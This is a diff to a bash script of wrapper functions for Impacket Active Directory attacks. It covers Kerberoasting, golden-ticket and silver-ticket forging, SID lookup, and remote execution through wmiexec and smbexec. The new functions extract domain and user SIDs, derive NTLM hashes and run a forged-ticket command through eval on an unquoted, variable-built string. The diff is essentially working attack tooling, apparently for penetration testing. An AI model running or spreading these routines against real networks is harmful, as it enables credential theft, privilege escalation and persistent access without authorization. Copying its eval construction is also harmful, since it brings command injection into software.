@@ -16,8 +16,7 @@ run_impacket() {
         hash_file="hashes"
     fi
     if [[ -z "$username" ]] ; then
-        echo "Username must be set before running Kerberoast."
-        return 1
+        echo "WARNING Username was not set. Ensure that you are sure about this"    
     fi
     if [[ -z "$domain" ]] ; then
         echo "No domain was set. Make sure you are sure about this"
@@ -164,6 +163,7 @@ run_impacket_golden_ticket() {
     ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain -user-id $ticket_uid $additional_options "$ticket_username"
 
 }
+
 run_impacket_wmiexec() {
     if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
@@ -204,8 +204,8 @@ run_impacket_smbexec() {
 }
 
 run_impacket_mssqlclient() {
-    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
-        echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
+    if [[ -z "$target_ip" ]]; then
+        echo "Target IP address must be set before running Impacket mssqlclient command."
         return 1
     fi
     if pgrep -f "mssqlclient.py .*$target_ip"; then
@@ -231,4 +231,66 @@ run_impacket_kerberoast() {
     target_ip=
     output_hashes="true"
     run_impacket "impacket-GetUserSPNs" "-request $1"
+}
+
+run_impacket_lookupsid() {
+    echo "Running Impacket LookUpSID..."
+    hash_file=""
+    output_hashes="false"
+    if [[ -z $username ]]; then
+        echo "Username must be set before running LookUpSID."
+        return 1
+    fi    
+    run_impacket "lookupsid.py"
+}
+
+run_impacket_silverticket() {
+    echo "Running Impacket SilverTicket..."
+    if [[ -z $spn ]]; then
+        spn="host/$domain"
+        echo "SPN not set, using default: $spn"
+    fi
+    ticket_additional_option="-spn $spn"
+    run_impacket_ticketer
+}
+
+run_impacket_ticketer() {
+
+    if [[ -z $target_username ]]; then
+        echo "Ticket target_username must be set before running ticketer."
+        return 1
+    fi
+    domain_information=$(run_impacket_lookupsid)
+    domain_sid=$(echo "$domain_information" | grep "Domain SID" | awk -F': ' '{print $2}' )
+    if [[ -z $domain_sid ]]; then
+        echo "Failed to extract Domain SID from LookUpSID output."
+        return 1
+    fi
+    echo "Domain SID: $domain_sid"
+    target_user_sid=$(echo "$domain_information" | grep "$target_username" | awk -F ':' '{print $1}')   
+    if [[ -z $target_user_sid ]]; then
+        echo "Failed to extract User SID for $target_username from LookUpSID output."
+        return 1
+    fi
+    echo "User SID: $target_user_sid"
+    local ticket_hash_option=""
+    if [[ -z $ntlm_hash ]] && [[ -z $aes_key ]]; then
+        if [[ ! -z $password ]]; then
+            ntlm_hash=$(generate_ntlm_hash "$password")
+        fi
+    fi    
+    if [[ ! -z $ntlm_hash ]]; then
+        ticket_hash_option+="-nthash $ntlm_hash "
+    fi
+    if [[ ! -z $aes_key ]]; then
+        ticket_hash_option+="-aesKey $aes_key "
+    fi
+    local ticket_authentication_option=""
+    #if [[ ! -z $username ]] && [[ ! -z $password ]]; then
+    #    ticket_authentication_option+="-request -user $username -password '$password' "
+    #fi
+    local ticketer_command="ticketer.py -domain-sid $domain_sid -user-id $target_user_sid -domain $domain $ticket_hash_option $ticket_authentication_option $ticket_additional_option \"$target_username\""
+    echo $ticketer_command
+    eval $ticketer_command
+
 }
